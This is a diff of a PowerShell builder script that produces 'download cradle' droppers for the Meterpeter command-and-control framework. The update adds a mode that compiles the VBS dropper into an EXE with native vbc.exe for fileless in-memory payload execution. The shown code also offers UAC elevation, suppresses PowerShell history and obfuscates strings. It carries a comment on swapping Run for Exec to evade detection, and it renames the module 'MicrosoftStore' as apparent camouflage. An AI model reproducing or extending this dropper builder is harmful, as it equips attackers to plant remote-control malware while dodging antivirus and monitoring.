@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: .NET\Framework\v4.0.30319\vbc.exe
-   PS cmdlet Dev version: v1.2.19
+   PS cmdlet Dev version: v1.2.20
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allows Meterpeter C2 v2.10.14
@@ -19,6 +19,13 @@
 
    If invoked -action 'fileless' then cmdlet creates Download_crandle.vbs
    with payload FileLess (ram) execution ( payload does not touch disk )
+
+   If invoked -action 'compile' together with -egg 'false' then cmdlet creates
+   script.vbs compiled to binary.exe with the help of native vbc.exe application
+   with payload FileLess (ram) technic execution ( payload does not touch disk )
+
+   Remark: compile function does not add [U]AC elevation function to dropper,
+   and only creates droppers using payload fileless technics 3 or 4 (ram exec)
 
    If invoked -UACElevation 'true' then cmdlet creates Download_crandle.vbs
    with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
@@ -69,8 +76,8 @@
    creates 'Download_crandle.vbs' (FileLess payload exec technic 2)
 
 .EXAMPLE
-   PS C:\> .\crandle_builder.ps1 -action 'fileless' -Technic 'three'
-   creates 'Download_crandle.vbs' (FileLess payload exec technic 3)
+   PS C:\> .\crandle_builder.ps1 -action 'compile' -Egg 'false'
+   creates 'Download_crandle.exe' (FileLess payload exec technic 4)
 
 .INPUTS
    None. You cannot pipe objects into crandle_builder.ps1
@@ -119,8 +126,8 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $gUid = -join ((65..90) + (97..122) | Get-Random -Count $StrLength | % {[char]$_}) # Only Random letters!
-$SCNa = "$PayloadName" -replace '.ps1','.vbs'
 $TokenAuth = Get-Random -Minimum 900 -Maximum 1300
+$SCNa = "$PayloadName" -replace '.ps1','.vbs'
 
 write-host ""
 If($Action -iNotMatch '^(download|fileless|compile)$')
@@ -129,7 +136,7 @@ If($Action -iNotMatch '^(download|fileless|compile)$')
    write-host " Wrong Parameter input " -NoNewline
    write-host "-action '$Action'`n" -ForegroundColor Red
    Get-Help .\crandle_builder.ps1 -full
-   Exit #Exit Crandle_Builder - Trigger Get-Help function!
+   Exit #Exit Crandle_Builder - trigger Get-Help!
 }
 
 
@@ -272,7 +279,6 @@ ElseIf($Action -ieq "fileless")
 
    .NOTES
       This function creates crandles with or without [U]AC elevation function.
-      Remark: objShell.Ru`n() replaced by objShell.E`xec() to evade detection.
    #>
 
 
@@ -437,7 +443,7 @@ ElseIf($Action -ieq "Compile")
    Helper - Creates VBS that can be compiled to EXE later
 
 .NOTES
-   This vbs only uses fileless technics
+   This vbs function only uses fileless technics 3 and 4.
    If invoked -action 'compile' together with -egg 'false'
    this function will compile dropper.vbs to dropper.exe
 #>
@@ -456,10 +462,8 @@ Else
    $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 
-
-##  TODO: use vbsencoder.vbs on this template.vbs [meterpeter] ?
-$ShantyDamaianti = "@S£y's£t@em£.@R£'u@nt£im@e.I@n£t@er'o@pS@er£v'i@£ce£s" -replace '(@|£|'')',''
-$VBStoExe = @("Public Module Whatever
+## Raw VBS program
+$VBStoExe = @("Public Module MicrosoftStore
 
 Sub Main
    Dim ObjSSLProvider As Object
@@ -476,7 +480,7 @@ Sub Main
 end sub
 End Module")
 
-   ## Build crandle VBS that meterpeter or this cmdlet compiles it to EXE
+   ## Build crandle VBS that meterpeter or this cmdlet compiles to EXE
    echo $VBStoExe|Out-File "$VbsName" -Encoding string -Force # Download_Crandle.vbs
 
    If($Egg -ieq "false") ## Non-@Meterpeter compiler function
@@ -551,13 +555,36 @@ End Module")
          write-host "missing: " -NoNewline
          write-host "$CmdLineToExecute`n" -ForegroundColor Red
 
-         ## CleanUP
+         ## Raw vbs script does not execute without compile function
          Remove-Item -Path "$VbsName" -Force # Download_Crandle.vbs
       }
    }
 
-   ## It leaves Download_Crandle.vbs in current directory
-   # If invoked using meterpeter C2 framework tool
+   If($Egg -match '^(true)')
+   {
+      write-host "*" -ForegroundColor Green -NoNewline
+      write-host " Creating " -NoNewline
+      write-host "$VbsName" -ForegroundColor Green -NoNewline
+      write-host " [" -NoNewline
+      write-host "$Action" -ForegroundColor DarkGray -NoNewline
+      write-host "]"
+
+      write-host "  x " -ForegroundColor Red -NoNewline
+      write-host "error  : fail to compile " -NoNewline
+      write-host "$VbsName" -ForegroundColor Red -NoNewline
+      write-host " to " -NoNewline
+      write-host "binary.exe" -ForegroundColor Red
+
+      write-host "  x " -ForegroundColor Red -NoNewline
+      write-host "remark : invoke -action '" -NoNewline
+      write-host "compile" -ForegroundColor Green -NoNewline
+      write-host "' -egg '" -NoNewline
+      write-host "false" -ForegroundColor Green -NoNewline
+      write-host "' to compile it`n"
+
+      ## Raw vbs script does not execute without compile function
+      Remove-Item -Path "$VbsName" -Force # Download_Crandle.vbs
+   }
    Exit
 }
 
